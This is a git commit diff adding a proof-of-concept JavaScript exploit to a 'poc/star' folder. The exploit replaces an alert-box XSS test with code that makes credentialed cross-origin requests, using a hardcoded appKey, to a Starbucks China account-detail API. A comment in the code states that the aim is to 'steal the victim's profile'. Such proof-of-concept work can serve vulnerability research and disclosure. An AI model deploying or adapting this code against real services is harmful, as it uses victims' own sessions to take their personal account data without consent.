a1938cdaab19c86a1980bccf8fccf4111bdd4c5b
koffdsa <51981550@qq.com>
2022-02-20 00:50:34 +0800

    Update get_information.js

--- poc/star/get_information.js
+++ poc/star/get_information.js
@@ -1,1 +1,44 @@
-alert("johnstone")
+
+async function postData(url = '', data = {}) {
+  // Default options are marked with *
+  const response = await fetch(url, {
+    method: 'POST', // *GET, POST, PUT, DELETE, etc.
+    mode: 'cors', // no-cors, *cors, same-origin
+    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+    credentials: 'include', // include, *same-origin, omit
+    headers: {
+      'Content-Type': 'application/json',
+      'appKey': '8c2efe7006da1b98b5cf631e4791f2f5',
+      'x-source-code': 'WEB'
+    },
+    redirect: 'follow', // manual, *follow, error
+    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
+    body: JSON.stringify(data) // body data type must match "Content-Type" header
+  });
+  return response.json(); // parses JSON response into native JavaScript objects
+}
+
+
+async function getData(url = '') {
+  // Default options are marked with *
+  const response = await fetch(url, {
+    method: 'GET', // *GET, POST, PUT, DELETE, etc.
+    mode: 'cors', // no-cors, *cors, same-origin
+    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+    credentials: 'include', // include, *same-origin, omit
+    headers: {
+      'appKey': '8c2efe7006da1b98b5cf631e4791f2f5',
+      'x-source-code': 'WEB'
+    },
+    redirect: 'follow', // manual, *follow, error
+    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
+    body: ''
+  });
+  return response.json(); // parses JSON response into native JavaScript objects
+}
+
+//Try to steal the victim's profile
+getData('https://profile.starbucks.com.cn/api/account/detail')
+  .then(data => {
+    console.log(data); // JSON data parsed by `data.json()` call
+  });
